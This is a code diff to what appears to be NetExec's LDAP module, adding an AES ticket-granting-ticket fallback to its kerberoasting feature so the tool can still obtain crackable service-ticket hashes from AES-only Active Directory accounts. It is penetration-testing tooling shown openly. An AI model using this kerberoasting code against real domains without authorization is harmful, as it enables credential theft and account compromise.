@@ -28,7 +28,7 @@ from impacket.dcerpc.v5.samr import (
 )
 from impacket.krb5 import constants
 from impacket.krb5.crypto import generate_kerberos_keys
-from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError
+from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError, KerberosError
 from impacket.krb5.ccache import CCache
 from impacket.krb5.types import Principal, KerberosException
 from impacket.ldap import ldap as ldap_impacket
@@ -973,6 +973,24 @@ class ldap(connection):
                     with open(self.args.asreproast, "a+") as hash_asreproast:
                         hash_asreproast.write(f"{hash_TGT}\n")
 
+    def _kerberoast_aes_fallback(self, err, current_tgt):
+        """Obtain (and cache) an AES TGT to retry kerberoasting when an AES-only account rejects the RC4 ticket."""
+        if err.getErrorCode() != constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+            return None
+
+        cached = getattr(self, "_kerberoast_aes_tgt", None)
+        if cached is not None:
+            # Already using the AES TGT and it still failed: nothing more to try for this account.
+            return None if current_tgt is cached else cached
+
+        if not self.password and not self.aesKey:
+            self.logger.fail("Target rejects RC4 (AES-only) and the current auth cannot request an AES TGT. Use password or --aesKey auth to kerberoast this account.")
+            return None
+
+        self.logger.info("Target rejects RC4 (AES-only); retrying kerberoasting with an AES TGT")
+        self._kerberoast_aes_tgt = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache, force_aes=True)
+        return self._kerberoast_aes_tgt
+
     def kerberoasting(self):
         if self.args.no_preauth_targets:
             self.roast_no_preauth()
@@ -1043,7 +1061,11 @@ class ldap(connection):
                     continue
 
             try:
-                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
+                if getattr(self, "_kerberoast_aes_tgt", None) is not None:
+                    # A previous account rejected RC4 (AES-only domain/account); reuse the AES TGT for the rest.
+                    TGT = self._kerberoast_aes_tgt
+                else:
+                    TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                 self.logger.debug(f"TGT: {TGT}")
                 if TGT:
                     try:
@@ -1051,14 +1073,30 @@ class ldap(connection):
                         principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                         principalName.components = [f"{self.targetDomain}\\{user['sAMAccountName']}"]
 
-                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
-                            principalName,
-                            self.domain,
-                            self.kdcHost,
-                            TGT["KDC_REP"],
-                            TGT["cipher"],
-                            TGT["sessionKey"],
-                        )
+                        try:
+                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                                principalName,
+                                self.domain,
+                                self.kdcHost,
+                                TGT["KDC_REP"],
+                                TGT["cipher"],
+                                TGT["sessionKey"],
+                            )
+                        except KerberosError as ke:
+                            # RC4 service ticket rejected by an AES-only account (KDC_ERR_ETYPE_NOSUPP).
+                            # Retry once with an AES TGT, mirroring the asreproast fallback behavior.
+                            aes_tgt = self._kerberoast_aes_fallback(ke, TGT)
+                            if aes_tgt is None:
+                                raise
+                            TGT = aes_tgt
+                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                                principalName,
+                                self.domain,
+                                self.kdcHost,
+                                TGT["KDC_REP"],
+                                TGT["cipher"],
+                                TGT["sessionKey"],
+                            )
                         out = KerberosAttacks(self).output_tgs(
                             tgs,
                             oldSessionKey,
